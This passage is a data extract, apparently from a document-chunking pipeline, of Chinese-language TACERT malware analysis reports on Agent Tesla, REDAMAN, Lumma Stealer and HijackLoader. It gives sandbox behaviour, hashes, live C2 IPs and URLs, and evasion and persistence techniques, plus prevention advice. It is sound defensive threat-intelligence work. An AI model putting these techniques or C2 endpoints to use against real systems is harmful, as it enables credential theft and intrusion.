        "content": "1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE 資訊竊取木馬Agent Tesla 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2022 年02 月  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 惡意軟體家族Agent Tesla 自2014 年出現,攻擊者將其運用來竊取主機上的 機密。 2. 它主要是透過電子郵件附件挾帶為感染途徑,而且是以服務型態提供的惡意 軟體(Malware-as-a-Service),這意味者攻擊者只要付費就能取得作案工具。 3. 資安公司CHECK POINT 在2022/1 所發布「CYBER SECURITY REPORT 2022」提到在2021 年全球最流行的十大惡意軟體中,Agent Tesla 也名列其中。 資料來源 : CHECK POINT 公司2022/1 所發布「CYBER SECURITY REPORT 2022」報告 4. 根據ASEC 分析團隊最新一次每週惡意軟體數量統計顯示(2022/01/31~ 2022/02/06),在主要類別中,資訊竊取軟體以 61.6% 排名第一,其次是 RAT 惡意軟體,佔 18.9%,銀行惡意軟體佔 11.3%,勒索軟體佔 4.4%,下載程 式佔 3.8%。在資訊竊取軟體中, Agent Tesla 再次以 40.3% 排名第一。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 資料來源 : ASEC (AhnLab Security Emergency-response Center) 5. 有鑑於惡意軟體Agent Tesla 感染事件流行頻繁,為了解其竊取資料的手法, 故進行檢測作業。 二、事件檢測 1. 首先,在32 位元之Windows 7 作業系統上,執行Agent Tesla 樣本 2b4fa26a5a.exe (MD5:611e2838acaba7b86ed0f40c3d0c81fb) 。 2. 從樣本內容發現,該軟體之詳細資料具有一般合法軟體所該有的基本資訊。 在該軟體之「詳細資料」中看到產品名稱與產品描述皆有「Binance」,它是",
        "Page_Num": "1,2,3"
    },
    "541": {
        "File_Name": "個案分析-資訊竊取木馬 Agent Tesla 分析報告.pdf",
        "content": "一家全球性的加密貨幣交易所,為超過100 種加密貨幣提供交易平台。2018 年初以來,幣安Binance 在交易量方面被認為是全世界上最大的加密貨幣交 易所。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 2b4fa26a5a.exe 執行後會再次呼叫自己來執行, 之後默默在背景中執行。 4. 2b4fa26a5a.exe 經Virustotal 檢測其惡意比例為49/70。它是2022/2 初首次被 上傳至Virustotal 檢測,為非常新的樣本。 5. 2b4fa26a5a.exe 執行後約10 分鐘會連線俄羅斯IP:46.30.40.108:587,之後約每 隔10 分鐘會定時連線該俄羅斯IP。它使用587port (SMTP 傳送的預設Port) 來進行SMTP 協定的傳輸。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. 該俄羅斯IP:46.30.40.108 經Virustotal 判定為「非惡意IP」。 7. 檢視主機連線俄羅斯IP 之封包,發現主機以信件方式傳送主機資訊給該IP。 (1) 寄件者:giftlog@milax.tk、收件者gift@milax.tk。 (2) 由「主旨:SC_Ruby/RUBY-PC」可看到使用者帳號與主機名稱。 (3) 傳送內容包含使用者帳號、主機名稱、作業系統、CPU 與RAM 資訊。 除了傳送主機資訊外,也傳送使用者於主機上所輸入與複製的內容,具有  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team Keylogger 功能。由下圖所傳送內容可得知使用者曾經複製一個網址,開啟 LINE 軟體輸入gasdf1290,之後曾在瀏覽器頁面上輸入msn 進行搜尋。其中 輸入LINE 之動作部分,在檢測當下檢測者開啟LINE,而帳號輸入部分因系 統已記錄,故僅輸入登入LINE 之密碼gasdf1290。若系統沒有記錄而輸入帳 號,則登入LINE 之帳號與密碼已被駭",
        "Page_Num": "3,4,5,6"
    },
    "542": {
        "File_Name": "個案分析-資訊竊取木馬 Agent Tesla 分析報告.pdf",
        "content": "客取得。 從下圖中發現使用者曾經輸入pchome,並且開啟過LINE 軟體輸入test 後又 按倒退鍵。 由下圖可得知,使用者在瀏覽器頁面上輸入pchome 後又輸入msn,之後開啟 MSN 帳戶登入頁面。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 在下圖中可得知,使用者開啟LINE 後點擊倒退鍵多次。 三、攻擊行為示意圖 1. 以電子郵件附件夾帶方式散播惡意程式Agent Tesla。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 在受害主機上執行惡意程式Agent Tesla。 3. 執行後Agent Tesla 會再次呼叫自己來執行,之後則隱藏自己於背景程式中默 默執行。 4. 受害主機約每隔10 分鐘以SMTP 協定連線俄羅斯IP,來傳送主機資訊與 Keylogger 紀錄。 四、總結與建議 1. Agent Tesla 是一個資訊竊取木馬(info stealer RAT),它可通過記錄擊鍵和 使用者輸入內容來收集有關受害者行為的資訊,使攻擊者能夠查看在運行 中程式和 Web 瀏覽器內所輸入的所有內容。 2. 它在出售此惡意軟體的專用網站上被錯誤地宣傳為合法軟體。網站錯誤地 聲稱該程式是為個人使用而建立的合法鍵盤記錄程式,因此 Agent Tesla 惡意軟體在駭客社群中變得非常流行。它會流行不僅是因為它的易用性和 技術支援,而是它可以在攻擊者出售該惡意軟體之「官方」網站上獲得。 3. 它使用SMTP 作為惡意軟體與控制伺服器連線的通訊協定。因為 SMTP 只能進行單向傳輸,而且只能傳送文字檔,無法傳送其他型態的檔案。又 SMTP 可輕易混在一般網路傳輸流量中,不容易被發現,而且使用簡單便 利。 4. Agent Tesla 惡意軟體不容易被識別。 保持安全的最有效方法是在打開可 疑電子郵件或訪問未知連結時保持謹慎。 最重要的是,必須小心下載來 自未知送件人的電子郵件中之附件,並嘗試識別詐騙。 ",
        "Page_Num": "6,7,8"
    },
    "543": {
        "File_Name": "個案分析-資訊竊取木馬REDAMAN分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE 資訊竊取木馬REDAMAN 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2023 年10 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 在2023 年7 月底~8 月初某高中持續觸發偵測規則「MALWARE-CNC Win.Trojan.Redaman outbound connection」,但學校無法有效處理,導致重複 觸發。該校發生同一網段中有5 個IP 被攻擊,而且攻擊時間相近,其連線目 的IP 皆為94.X.X.112 :80 (德國),推測有橫向移動攻擊之情形。 2. 在學術網路中2023 年01~08 月共有19 件Redaman 資安事件發生,其中大學 有9 件、高中有10 件。 3. REDAMAN 在2015 年首次出現,是高危險的資訊竊取木馬。在大多數情況 下,REDAMAN 是通過垃圾郵件活動進行散播的。它的威脅類型屬於特洛伊 木馬、竊取密碼的病毒、銀行惡意軟體與間諜軟體等。 4. 其感染途徑為社交工程,如受感染的電子郵件附件、惡意線上廣告、軟體破 解等。網路罪犯基本上是發送數千封的欺騙性電子郵件,鼓勵收件者打開附 件(例如: Microsoft Office 文件、存檔的可執行文件等) ,進而將REDMAN 感 染到系統中。 5. 為了解Redaman 之攻擊行為,故進行該樣本檢測作業。 二、 事件檢測 1. 在64 位元的Windows 7 環境下,執行樣本ceb8efb.exe  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (MD:df725667733410f1a023a76d36fcbd31),在執行7 秒後該樣本在所在資料 夾內消失。 2. 該樣本經Virustotal 檢測其惡意比例為60/71。 3. 該樣本執行後會建立工作",
        "Page_Num": "1,2,3"
    },
    "544": {
        "File_Name": "個案分析-資訊竊取木馬REDAMAN分析報告.pdf",
        "content": "排程,呼叫rundll32.exe 來執行。 4. Rundll32.exe 會讀取C:\\ProgramData\\laokhpba\\iafdpbjl.imk 檔案,而且該 Rundll32.exe 會每次開機後自動執行。 5. Rundll32.exe 執行時會一直對外連線下列目的IP 之53port,而且在每次開機 後執行rundll32.exe 就會連線。所連線目的IP 有188.165.200.156 (法國) (Virustotal:12/89)、5.135.183.146 (法國 ) (Virustotal:6/89)、109.69.8.34 (西班牙) (Virustotal:4/89)、151.80.147.153 (法國) (Virustotal:9/89)與185.190.82.182 (美 國) (Virustotal:1/89)等,而且這些IP 設備為DNS Server。檢視這些連線之封  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 包,發現僅有連線未傳輸任何資料,推測此行為僅在建立連線管道。 6. 樣本ceb8efb.exe 執行後,會在C:\\ProgramData\\與C:\\使用者\\All Users 產生含 有iafdpbjl.imk 檔案之laokhpba 資料夾。laokhpba 為隱藏資料夾,iafdpbjl.imk 為一個隱藏檔,因為使用隱藏功能,導致使用者不容易發現到它們的存在。 7. 檢視iafdpbjl.imk 內容,發現為亂碼。 8. 檢視工作排程內容,發現一個Windows Update 的工作排程。該排程在使用者 TEST 登入時執行,而且會啟動rundll32.exe 來執行 C:\\ProgramData\\laokhpba\\iafdpbjl.imk。該工作排程偽裝為合法的Windows 更  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 新排程,不容易讓使用者發現異常。 9. REDAMAN 有感染流量之特徵,故檢視其側錄封包,發現有連線namecha[.]in 之IP 情形,但並未",
        "Page_Num": "3,4,5"
    },
    "545": {
        "File_Name": "個案分析-資訊竊取木馬REDAMAN分析報告.pdf",
        "content": "有進一步連線後續感染流量之IP(C2 server)行為。所連線 IP 有172.67.222.47:443 與104.21.70.92:443(皆為美國IP,Virustotal 檢測為非 惡意IP)。此外,namecha[.]in 是一個Namecoin 區塊瀏覽器,而Namecoin 是 一種可用於去中心化DNS 的加密貨幣系統。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、 攻擊行為 經由檢測可推測出駭客攻擊手法如下圖。首先,Redaman 利用社交工程方 式散播本身。待Redaman 感染受害主機後,會產生存有iafdpbjl.imk 的隱 藏資料夾。接著它會建立Windows update 的工作排程來執行,而當這排 程執行時會執行rundll32.exe 來連線國外IP 的53port。為感染流量,它也 會連線namech.in,以利後續連線之後的C2 Server。 四、 總結與建議 1. 經檢測後總結REDAMAN 特徵如下。 (1) REDAMAN 主要透過社交工程方式散播,在主機感染後會建立隱藏資料 夾,並新增Windows Update 工作排程,來持續執行rundll32.exe 去對外連 線。 (2) 在建立工作排程並載入 DLL 後,初始的 Redaman 執行檔會自行刪除。 除受害主機外,它也會橫向移動攻擊網域內其他主機。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 它會竊取資訊,能夠截取螢幕截圖、記錄擊鍵以及竊取信用卡資訊。它也 能記錄基本的系統資訊,並將收集的資訊保存到遠端伺服器內。 (4) 該木馬旨在秘密地滲透到受害者的主機並保持沉默,因此在受感染的主機 上沒有明顯可見的特定症狀。 (5) 有數十種木馬類型病毒與REDAMAN 一樣會竊取資訊,例如:TrickBot、 Emotet、LokiBot 和 Adwind。 2. 在REDAMAN 可能造成的影響方面,由於REDA",
        "Page_Num": "5,6,7"
    },
    "546": {
        "File_Name": "個案分析-資訊竊取木馬REDAMAN分析報告.pdf",
        "content": "MAN 會竊取資訊,所以會 對CIA 中的機密性造成衝擊。 3. 關於感染REDAMAN 的處理方式,使用者若最近有打開過任何可疑的電子郵 件附件,建議檢查Windows 工作排程器中列出的可疑排程。若使用者懷疑 REDAMAN 可能已滲透到主機內,建議可使用防毒軟體或反間諜軟體掃描系 統,來移除檢測到的惡意軟體。 4. 在未來預防REDAMAN 的方面,因REDAMAN 是透過社交工程方式散播, 建議使用者不要開啟不明來源的郵件附件、不要從不明來源網站下載與安裝 軟體, 以杜絕其散播管道。 五、 參考資料 1. REDAMAN Trojan https://www.pcrisk.com/removal-guides/13783-redaman-trojan 2. Russian Language Malspam Pushing Redaman Banking Malware https://unit42.paloaltonetworks.com/russian-language-malspam-pushing-redaman- banking-malware/ 3. TrojanSpy.Win32.REDAMAN.AA https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojanspy.win 32.redaman.aa ",
        "Page_Num": "7"
    },
    "547": {
        "File_Name": "個案分析-資訊竊取程式Lumma Stealer之分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE 資訊竊取程式Lumma Stealer 之分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2024 年08 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 根據ANYRUN 沙箱平台的惡意軟體趨勢追蹤器統計,在2024/07/12 ~ 2024/08/11 這30 天內最著名的惡意軟體為Lumma。在30 天內有440 個樣本檢測數量,與第二名249 個有大差距,可見這期間有許多Lumma 的攻擊產生。為了了解Lumma 的攻擊行為,故對其樣本進行檢測作業。 二、 Lumma Stealer 1. Lumma Stealer(又稱為 LummaC2 Stealer)在2022 年08 月首次被發現。 (1) 它在暗網論壇和Telegram 管道上,以惡意軟體即服務的形式出售, 並提供多種服務方案給買家選擇。 (2) 它通常針對受感染系統上的加密貨幣錢包、登入憑證和其他敏感資 訊進行竊取。 (3) 它會定期獲取更新,以改進和擴展其功能,使其成為一個嚴重的資 訊竊取威脅。 2. 2023 年11 月資安公司趨勢科技發現駭客透過 Discord 平台來散播 Lumma Stealer。駭客會使用 Discord 的內容派送網路 (CDN) 來儲存及  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 散播 Lumma Stealer。駭客利用這個社群平台的應用程式開發介面 (API) 來開發機器人程式,用來與惡意程式通訊並進行遠端遙控。這些機器人 也會將偷到的資料傳送到私人 Discord 伺服器或頻道。 3. 2024 年01 月FortiGuard Lab 發現駭客利用YouTube 頻道散播Lumma Stealer。駭客向使用者提供含有惡意網址的安裝指南,並利用GitHub 和MediaFire 等開源平台,取代部署自己的惡意伺服器。這些開源平台 讓使用者直接下載一個新的私有.NET Loader",
        "Page_Num": "1,2,3"
    },
    "548": {
        "File_Name": "個案分析-資訊竊取程式Lumma Stealer之分析報告.pdf",
        "content": ",來散播變種Lumma Stealer。在這次攻擊中,駭客使用精心製作的安裝壓縮檔案作為一個誘 餌來傳遞惡意程式。巧妙地利用使用者想安裝破解程式的意圖,促使他 們毫不猶豫地點擊安裝檔案。整個過程中使用開源平台網址的目的在減 弱使用者的警覺性。 4. 2024 年04 月因假的瀏覽器更新網頁導致了大量惡意軟體感染,其中包 括Lumma Stealer。當使用者瀏覽包含惡意 JavaScript 的受感染網頁時, 會觸發注入的惡意 JavaScript 程式碼,從而將使用者引導至虛假的軟體 更新網頁,進而下載惡意的ZIP 更新檔。 5. 2024 年06 月駭客誘騙使用者下載受密碼保護的檔案,包含 Cisco Webex Meetings 應用程式的木馬副本。當受害者執行安裝檔案時,Cisco Webex Meetings 應用程式會秘密載入程序,從而導致資訊竊取模組程式的執 行。 6. Lumma Stealer 對多種電腦系統構成重大威脅。它的主要攻擊目標是執 行 Windows 作業系統的裝置。因為它的這種廣泛的兼容性使惡意軟體 能夠滲透到龐大的系統網路,從而增加其潛在的影響力。 7. Lumma Stealer 之功能 (1) 資料外洩 它能有效地從目標應用程式收集敏感資訊,包括登入憑證、財務資 料和個人詳細資訊。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) 定期更新 它能定期執行自動更新。 (3) 資料日誌收集 它可從受感染的主機收集詳細的資料日誌,包括從瀏覽器和加密貨 幣錢包中提取的資訊。 (4) 載入程式功能 竊取者可以將其他的惡意軟體投放到受感染的主機上,從而擴大它 的惡意功能和潛在影響。 Lumma Stealer 具有廣泛的功能,使其成為網路犯罪者的多功能工具。 例如,竊取者傳輸的所有資料都在伺服器端解密,這使得在滲透過程中 分析惡意軟體的流量變得更加困難。 8. Lumma Stealer 之散播方式 (1) 仿冒軟體 散播 Lumma Stealer 的",
        "Page_Num": "3,4"
    },
    "549": {
        "File_Name": "個案分析-資訊竊取程式Lumma Stealer之分析報告.pdf",
        "content": "最受歡迎方法之一是透過假軟體。當毫無戒 心的使用者下載並安裝這些虛假應用程式時,他們會將惡意軟體引 入他們的系統中。 (2) 網路釣魚電子郵件 網路釣魚電子郵件是廣泛使用的惡意軟體散播攻擊媒介。網路犯罪 者製作看似來自合法來源(例如銀行、電子商務平台或社群媒體網 路)的電子郵件,來散播Lumma Stealer。。 (3) Discord 訊息 在某些情況下,Lumma Stealer 攻擊者會透過在聊天平台 Discord 上直接發送訊息來尋找受害者。攻擊者會與受害者接觸,試圖建立 信任並說服他們以虛假藉口下載受感染的可執行檔。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 三、 Lumma 樣本檢測 1. 在ANYRUN 沙箱下檢測Lumma 樣本fKYrTm48vZ.exe,它執行後會呼 叫Regasm.exe 來執行,而Regasm.exe 執行後會呼叫Werfault.exe 來執 行。 (1) fKYrTm48vZ.exe 的MD5 為d5c9bbccffc7a6a92b61c567c6a23e81。 (2) 它執行後會刪除自己本身。 (3) 它會讀取主機名稱與檢查支援的語言。 2. Regasm.exe 執行後會有下列行為。 (1) 竊取個人資料。 (2) 執行WerFault.exe。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 聯絡 C&C 的伺服器,連線IP:188.114.96.3 Port:443。 (4) 搜尋已安裝的軟體。 (5) 在暫存目錄中建立檔案。 (6) 讀取軟體策略的設定與主機名稱,以及檢查支援的語言。 3. WerFault.exe 執行後會有下列行為。 (1) 在使用者目錄中建立檔案或資料夾。 (2) 讀取軟體策略的設定與檢查代理伺服器的資訊。 4. 從網路連線發現,Regasm.exe 所連線的美國IP:188.114.96.3 為一個C2  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team Server 的",
        "Page_Num": "4,5,6,7"
    },
    "550": {
        "File_Name": "個案分析-資訊竊取程式Lumma Stealer之分析報告.pdf",
        "content": "IP。該IP 所對應到的網址為hookybeamngwskow.xyz,是與 Lumma 有關的C2 網址。該IP 經Virustotal 檢測為3/93,網址 hookybeamngwskow.xyz 經檢測為10/93。 5. IP:188.114.96.3 屬於Cloudflare CDN(內容派送網路)的IP,在AbuseIPDB 上被檢舉 508 次,它首次被檢舉於 2023 年 12 月 21 日。最近一次 被檢舉是在 2024 年08 月09 日被檢舉有網路釣魚行為,可見它可能 仍被濫用中。 6. 以MITRE ATT&CK Matrix 分析Lumma,發現該樣本所運用技術橫跨 Credential access 、Discovery 與C&C 等3 個階段,其中包含竊取個人 資料、連線C&C Server。 四、 事件攻擊行為 由Lumma 攻擊行為可畫出下面攻擊行為示意圖,一開始駭客利用仿冒軟 體、網路釣魚郵件與Discord 訊息等方式來散播Lumma。當主機執行 Lumma 時會呼叫Regasm.exe 來執行,接著Regasm.exec 執行後會呼叫  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team WerFault.exe。在這些程式執行期間,它會刪除自己本身、讀取主機名稱、 檢查支援的語言、竊取個人資料、連線C2 Server、搜尋已安裝的軟體、 在暫存目錄中建立檔案、讀取軟體策略的設定、在使用者目錄中建立檔案 或資料夾,以及檢查代理伺服器的設定等行為。 因為駭客想隱藏攻擊行為,所以Lumma Stealer 的執行鏈就盡可能地保持 簡單,導致在受害主機上沒有太多程序,也沒有使用到系統工具。當 Lumma 感染主機後會立即開始執行,它的唯一程序是負責執行所有的攻 擊行為,包括竊取資料與連線C2 Server。 五、 總結與建議 1. Lumma Stealer 能夠從受害者主機中竊取敏感資料,它針對系統資訊、瀏 覽器、加密錢包和",
        "Page_Num": "7,8"
    },
    "551": {
        "File_Name": "個案分析-資訊竊取程式Lumma Stealer之分析報告.pdf",
        "content": "瀏覽器擴充程式進行攻擊。為了規避檢測和分析,它 使用多種混淆技術。它會與C2 伺服器建立連線,以達成指令交換並傳 送所竊取的資料, 並且透過連線能自動更新程式。 2. 在可能影響方面,它會造成的潛在損害如下:資料竊取、遠端控制、隱 私洩漏,所以會對CIA 中的「機密性」造成衝擊。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 在處理方式方面,有下列兩點建議提供參考。 (1) 在處理本類攻擊事件時,使用者可先使用防毒軟體對受害主機進行 掃描。 (2) 使用TCPView 或CurrPorts 等網路連線監控工具,來查看主機是否有 連線C2 Server,以辨別主機是否感染Lumma 與找出其所在之處。 4. 由於Lumma Stealer 的威脅日益嚴重,需要採取積極主動的網路安全方 法。隨著它變得越來越普遍,個人和組織必須了解其多樣化的散播方法 並採取保護措施。在防範措施方面,有五點建議如下提供參考。 (1) 不從未知來源下載和執行軟體。 (2) 不隨意開啟郵件的附件或點選不明的連結。 (3) 定期檢視主機上是否有不明的網路連線。 (4) 不在惡意軟體常用的路徑上建立 PE 檔案(例如: %PROGRAMDATA%)。 (5) 定期更新病毒碼並使用防毒軟體掃毒,以防範惡意威脅。 參考資料 1. Fortinet 詳細揭露駭客組織利用YouTube 散播Lumma 變種攻擊手法 https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=10 898 2. Fake Browser Updates delivering BitRAT and Lumma Stealer https://www.esentire.com/blog/fake-browser-updates-delivering-bitrat-and- lumma-stealer 3. 小心:Lumma Stealer 資訊竊取程式透過 Discord CDN 散播 https://www.trendmicro.com/zh_tw/research/23/k/beware-lumma-stealer-di stributed-via-discord-cdn-",
        "Page_Num": "8,9"
    },
    "552": {
        "File_Name": "個案分析-資訊竊取程式Lumma Stealer之分析報告.pdf",
        "content": ".html 4. Lumma https://any.run/malware-trends/lumma https://app.any.run/tasks/7c6cf961-3516-4855-8b81-db67169a026d ",
        "Page_Num": "9"
    },
    "553": {
        "File_Name": "個案分析-載入程式HijackLoader之分析報告.pdf",
        "content": "0 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team TLP:WHITE 載入程式HijackLoader 之分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2024 年05 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、事件簡介 1. 在2023 年7 月HijackLoader 首次被發現,此後被用於針對各個行業組 織(包括飯店業)的攻擊中。它能夠使用各種模組進行程式碼注入和 執行,這是大多數載入器不具備的功能,其模組化設計是它受歡迎的 關鍵因素之一。 2. HijackLoader 對飯店攻擊之案例 攻擊者透過電子郵件與飯店聯繫以預訂房間,並以食物過敏為藉口寄 送含有惡意壓縮檔的下載連結。這些連結通常指向信譽良好的雲端硬 碟服務平台(例如:dropbox.com、drive.google.com 等)來提供檔案下 載 。攻擊者也透過 Booking 與飯店聯繫,並使用非常類似的方式; 它 們告知飯店應考慮的某些禁忌症狀,以避免所附醫療處方中描述的某 些過敏問題。上述的行為皆在誘騙收信的工作人員下載包含其過敏資 訊的檔案。一旦打開,該檔案就會啟動感染鏈,導致在受害者的裝置 上安裝 HijackLoader。 3. HijackLoader(又稱 IDAT Loader)是一種載入器惡意軟體,具有強大 的規避能力,可以繞過主流安全措施,可在受感染系統上散播不同類 型惡意軟體。根據觀察,它散播了許多持久性惡意軟體系列,例如 DanaBot 和 RedLine 竊取程式。 4. HijackLoader 背後的攻擊者首選的滲透方法是網路釣魚攻擊,網路犯罪 分子會製作看似來自合法來源的電子郵件,希望誘騙收件者打開惡意 附件或點擊受感染的連結(如飯店攻擊案)。 5. HijackLoader 變種採用複雜的技術來增強其複雜性和強化迴避偵測能 力。 (1) 將惡意程式及相關工具加入Microsoft Defender 的白名單。 (2) 繞過使用者帳號控制",
        "Page_Num": "1,2"
    },
    "554": {
        "File_Name": "個案分析-載入程式HijackLoader之分析報告.pdf",
        "content": "(UAC)。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) 採用處理程序挖空(Process Hollowing)手法。 (4) 針對端點防護軟體經常使用的內部API 掛鉤進行迴避。 6. 2024 年3 月ThreatLabz 研究人員分析了約 50 個HijackLoader 樣本, 來確定HijackLoader 目前散播的是哪些惡意軟體,其中以Amadey 被 散播的比例最高。 (資料來源:https://www.zscaler.com/blogs/security-research/hijackloader -updates#indicators-of-compromise--iocs-) HijackLoader 散播的惡意軟體如下: (1) Amadey:該木馬能收集有關受害者系統的資料並能夠下載其他惡意 軟體。Amadey 為HijackLoader 散播時所提供的最受歡迎之惡意軟 體,佔觀察到的實例的 52.9%,明顯高於其他惡意軟體。 (2) Lumma Stealer (aka LummaC2 Stealer):資訊竊取程式,從加密貨幣錢 包、Steam 帳戶、KeePass、FileZilla 和瀏覽器擴充功能等項目中 竊取資料。 (3) Racoon Stealer v2:資訊竊取程式,竊取已儲存的密碼、cookie、自 動填入資料和加密貨幣錢包等資料。 (4) Remcos:遠端存取木馬 (RAT) 用於取得受害者系統的後門存取權 限。 (5) Meta Stealer:針對瀏覽器、加密貨幣錢包、錢包擴充功能和 Steam  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 帳戶的資訊竊取程式,與Redline Stealer 有許多相似之處。 (6) Rhadamanthys:為針對錢包、電子郵件、記事應用程式和留言等資 訊的竊取程式。 二、 事件檢測 1. 在AnyRun 沙箱環境下,執行樣本66055eb5779265037160e80546c6 de3d.exe(MD5:66055eb5779265037160e80546c6de3d)。此樣本結合 hijackloader",
        "Page_Num": "2,3,4"
    },
    "555": {
        "File_Name": "個案分析-載入程式HijackLoader之分析報告.pdf",
        "content": "、loader、miner 與phonk 等特性。它經Virustotal 檢測其惡 意比例為57/73。在它執行後會呼叫VCDDaemon.exe,而 VCDDaemon.exe 會呼叫cmd.exe 來執行conhost.exe 與MSBuild.exe。最 後MSBuild.exe 執行後會呼叫ngen.exe 來執行。 2. 66055eb5779265037160e80546c6de3d.exe 執行後會有下列行為: (1) 開始執行後立即刪除自己。 (2) 在使用者目錄中產生相同樣本檔案或資料夾。 (3) 讀取電腦名稱。 (4) 檢查支援的語言。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. VCDDaemon.exe 執行後會有下列行為: (1) 啟動 CMD.EXE 執行指令。 (2) 在暫存目錄中建立檔案。 (3) 讀取電腦名稱。 (4) 檢查支援的語言。 (5) 由使用者手動執行它。 4. cmd.exe 執行後會有下列行為:被檢測到為HijackLoader。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. MSBuild.exe 執行後會有下列行為: (1) 連線到 CnC 伺服器。(目的IP:89.208.107.12:80) (2) 被檢測到為 PHONK 。 (3) 連線到沒有主機名稱的伺服器。(http[://]89.208.107.12/BEBRIK.php) (4) 在使用者目錄中建立檔案或資料夾。 (5) 檢查代理伺服器資訊。 (6) 讀取環境數值。 (7) 從登錄檔中讀取機器 GUID。 (8) 讀取電腦名稱。 (9) 檢查支援的語言。 (10) 在程式目錄中建立檔案。 6. ngen.exe 執行後會有下列行為:  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (1)被檢測到為MINER。(目的IP:141.95.45.234:1123) (2)連接到 CnC 伺服器。(目的IP:141.95.45.234:1123) (3)連接到異常連接埠。(port:1123) (4)檢查支援的語言。 (5)讀取電腦名稱。 7. 檢視對外",
        "Page_Num": "4,5,6,7"
    },
    "556": {
        "File_Name": "個案分析-載入程式HijackLoader之分析報告.pdf",
        "content": "連線情形,發現會連線兩個目的IP:89.208.107.12(荷蘭)與 141.95.45.234(法國)。http[://]89.208.107.12/BEBRIK.php 經Virustotal 檢 測其惡意比例為7/92,為Phonk C2。141.95.45.234 經Virustotal 檢測其 惡意比例為1/90 ,可能為礦池。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 以MITRE ATT&CK Matrix 分析HijackLoader,發現該樣本所運用技術 橫跨Execution、Discovery 與C&C 等3 個階段,其中包含查詢登錄檔 內容、連線C&CServer。 三、 事件攻擊行為 經由樣本檢測可歸納出HijackLoader 的攻擊行為如下圖所示,當駭客透過 網路釣魚散播HijackLoader 後,一旦受害主機受感染會陸續下載所搭配的 惡意程式,並且也會連線C2 Server。HijackLoader 載入程式利用 CMD 執 行命令程式來隱藏在偵測雷達之下。反過來,它啟動 MSBuild 程式,該 程式下載並執行 Phonk,從而下載挖礦程式。 HijackLoader 展示了規避 功能,有助於不被某些安全軟體檢測到。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 總結與建議 1. 經由AnyRun 沙箱得知,HijackLoader 透過網路釣魚感染受害主機後, 可以下載不同類型的惡意軟體,如本案散播挖礦程式與PHONK ,而 且它也會對外連線兩個C2 Server。由於它刪除自己後在背景程式中默 默執行,不易被發現,加上可搭配不同類型的惡意軟體,將造成不小 的資安威脅。 2. 在可能影響方面,它會造成的潛在損害因其散播下載的惡意軟體而不 同,所以皆可能對CIA 中任一者造成衝擊。 3. 對於感染HijackLoader 的主機有下列處理建議提供學校參考。 (1) ",
        "Page_Num": "7,8,9"
    },
    "557": {
        "File_Name": "個案分析-載入程式HijackLoader之分析報告.pdf",
        "content": "由於它會下載惡意軟體於受害主機上,故建議可先使用防毒軟體對 受害主機進行掃毒 。 (2) 使用網路連線監控工具(如TCPView 或Currports 等),來查看主機 是否有連線C2 Server,以辨別主機是否感染HijackLoader 與找出 其所下載的軟體所在之處。 4. 為避免未來再次發生類似案件,有下列預防措施提供學校參考。 (1) 定期更新防毒軟體。 取得最新的病毒碼,以有效即時保護主機之安全。 (2) 善用防火牆。 利用防火牆監視和控制流入和流出的網路流量,而啟用防火牆可能 有助於阻止惡意連線。 (3) 警惕電子郵件之下載連結。 HijackLoader 透過網路釣魚散播。對於從電子郵件所附之連結下載 檔案,請謹慎行事。 (4) 謹慎瀏覽網站。 攻擊者可能會利用合法的雲端硬碟平台來散播 HijackLoader 和其  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 他惡意軟體,需密切注意造訪的網站,不要過度信任網站上的任何 檔案。 參考資料 1. HijackLoader Expands Techniques to Improve Defense Evasion https://www.crowdstrike.com/blog/hijackloader-expands-techniques/ 2. Hijackloader https://any.run/malware-trends/hijackloader 3. HijackLoader Targets Hotels: A Technical Analysis https://alpine-sec.medium.com/hijackloader-targets-hotels-a-technical-analysis -c2795fc4f3a3 4. HijackLoader Updates 